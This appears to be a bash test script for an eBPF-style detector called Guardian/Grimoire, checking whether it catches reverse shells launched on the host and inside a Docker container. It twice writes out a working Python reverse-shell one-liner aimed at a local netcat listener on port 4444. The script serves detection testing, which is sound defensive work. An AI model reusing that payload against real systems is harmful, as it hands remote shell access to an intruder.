#!/bin/bash
# Container Blind Spot Investigation
# Purpose: Test if Grimoire can detect attacks inside Docker containers
#
# THE DOCTRINE OF THE SOVEREIGN BLIND SPOT:
# "The Guardian watches all, but can it see through the walls of the container?"
#
# Test Scenarios:
# 1. Host attack (baseline - should work)
# 2. Container attack (potential blind spot)

set -e

echo "═══════════════════════════════════════════════════════════════"
echo "🔬 THE ORACLE INVESTIGATES: Container Blind Spot Analysis"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Cleanup
echo "1. Cleanup: Killing old processes and containers..."
sudo pkill -9 zig-sentinel 2>/dev/null || true
sudo pkill -9 nc 2>/dev/null || true
docker stop test-attack-container 2>/dev/null || true
docker rm test-attack-container 2>/dev/null || true
sleep 2

cd /home/founder/github_public/guardian-shield

# Check Guardian binary exists
echo "2. Checking Guardian binary..."
if [ ! -f ./zig-out/bin/zig-sentinel ]; then
    echo "❌ Guardian binary not found at ./zig-out/bin/zig-sentinel"
    echo "   Please run: /usr/local/zig/zig build"
    exit 1
fi
echo "   ✓ Guardian binary found"
echo ""

# Start listener
echo "3. Starting netcat listener on port 4444..."
nc -lvnp 4444 > /tmp/nc-listener.log 2>&1 &
NC_PID=$!
sleep 1

# Start Guardian
echo "4. Starting Guardian with Grimoire (60 second monitoring window)..."
sudo ./zig-out/bin/zig-sentinel \
    --enable-grimoire \
    --grimoire-debug \
    --duration=60 \
    > /tmp/container-test.log 2>&1 &
GUARDIAN_PID=$!

echo "   Guardian PID: $GUARDIAN_PID"
echo "   Waiting 5 seconds for initialization..."
sleep 5

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "🎯 TEST 1: HOST-BASED REVERSE SHELL (Baseline)"
echo "═══════════════════════════════════════════════════════════════"
echo ""

echo "Executing Python reverse shell on HOST..."
python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])" &
HOST_ATTACK_PID=$!

echo "   Host attack PID: $HOST_ATTACK_PID"
echo "   Waiting 3 seconds for Grimoire detection..."
sleep 3

# Kill host attack
kill -9 $HOST_ATTACK_PID 2>/dev/null || true
echo "   Host attack terminated"

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "🐳 TEST 2: CONTAINER-BASED REVERSE SHELL (Blind Spot Test)"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Check if Docker is available
if ! command -v docker &> /dev/null; then
    echo "❌ Docker not found - skipping container test"
    echo "   Install Docker to test container blind spot theory"
else
    echo "Creating attack container with Python..."
    docker run -d --name test-attack-container --network host python:3.11-slim sleep 3600 > /dev/null
    sleep 2

    CONTAINER_ID=$(docker ps -q -f name=test-attack-container)
    echo "   Container ID: $CONTAINER_ID"

    # Get container's PID namespace from host perspective
    CONTAINER_INIT_PID=$(docker inspect -f '{{.State.Pid}}' test-attack-container)
    echo "   Container init PID (host perspective): $CONTAINER_INIT_PID"

    # Execute attack inside container
    echo ""
    echo "Executing Python reverse shell INSIDE CONTAINER..."
    docker exec -d test-attack-container python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('127.0.0.1',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])"

    echo "   Waiting 3 seconds for Grimoire detection..."
    sleep 3

    echo "   Stopping container..."
    docker stop test-attack-container > /dev/null 2>&1
    docker rm test-attack-container > /dev/null 2>&1
fi

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "⏳ Waiting for Guardian to complete monitoring window..."
echo "═══════════════════════════════════════════════════════════════"
sleep 10

# Kill listener and Guardian
kill -9 $NC_PID 2>/dev/null || true
sudo kill -INT $GUARDIAN_PID 2>/dev/null || true
sleep 3

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "📊 ANALYSIS"
echo "═══════════════════════════════════════════════════════════════"
echo ""

# Parse host attack results
echo "HOST ATTACK RESULTS:"
echo "───────────────────────────────────────────────────────────────"
if grep -q "PID=$HOST_ATTACK_PID" /tmp/container-test.log; then
    echo "✅ Grimoire SAW the host attack PID"

    HOST_MATCHES=$(grep -c "GRIMOIRE MATCH.*PID=$HOST_ATTACK_PID" /tmp/container-test.log || echo "0")
    echo "   Pattern matches: $HOST_MATCHES"

    if [ "$HOST_MATCHES" -gt 0 ]; then
        echo "   ✅ HOST ATTACK DETECTED!"
        grep "GRIMOIRE MATCH.*PID=$HOST_ATTACK_PID" /tmp/container-test.log | head -1
    else
        echo "   ❌ Saw syscalls but NO pattern match"
    fi
else
    echo "❌ Grimoire NEVER saw the host attack PID"
    echo "   (This is unexpected - host attacks should be visible)"
fi

echo ""
echo "CONTAINER ATTACK RESULTS:"
echo "───────────────────────────────────────────────────────────────"

if command -v docker &> /dev/null; then
    # Look for any PIDs in the container's namespace
    CONTAINER_NS=$(grep "ns=[0-9]*.*container=true" /tmp/container-test.log | head -1 | sed -n 's/.*ns=\([0-9]*\).*/\1/p')

    if [ -n "$CONTAINER_NS" ]; then
        echo "✅ Grimoire SAW container namespace: $CONTAINER_NS"

        CONTAINER_MATCHES=$(grep "container=true" /tmp/container-test.log | grep -c "GRIMOIRE MATCH" || echo "0")
        echo "   Pattern matches in container: $CONTAINER_MATCHES"

        if [ "$CONTAINER_MATCHES" -gt 0 ]; then
            echo "   ✅ CONTAINER ATTACK DETECTED!"
            grep "container=true" /tmp/container-test.log | grep "GRIMOIRE MATCH" | head -1
        else
            echo "   ⚠️  Saw container syscalls but NO pattern match"
            echo "   This suggests pattern matching is working but may need tuning"
        fi
    else
        echo "❌ Grimoire NEVER saw any container namespace PIDs"
        echo "   🔍 BLIND SPOT CONFIRMED: Container attacks are invisible"
    fi
else
    echo "⊘ Docker not available - container test skipped"
fi

echo ""
echo "NAMESPACE VISIBILITY:"
echo "───────────────────────────────────────────────────────────────"
UNIQUE_NS=$(grep "ns=[0-9]" /tmp/container-test.log | sed -n 's/.*ns=\([0-9]*\).*/\1/p' | sort -u | wc -l)
echo "Unique namespaces seen: $UNIQUE_NS"
echo ""
echo "Container-flagged events:"
grep -c "container=true" /tmp/container-test.log || echo "0"

echo ""
echo "═══════════════════════════════════════════════════════════════"
echo "📜 FULL DEBUG LOG: /tmp/container-test.log"
echo "═══════════════════════════════════════════════════════════════"
echo ""
echo "To examine all debug output:"
echo "  cat /tmp/container-test.log"
echo ""
echo "To examine namespace information:"
echo "  grep 'GRIMOIRE-DEBUG.*ns=' /tmp/container-test.log | head -20"
echo ""
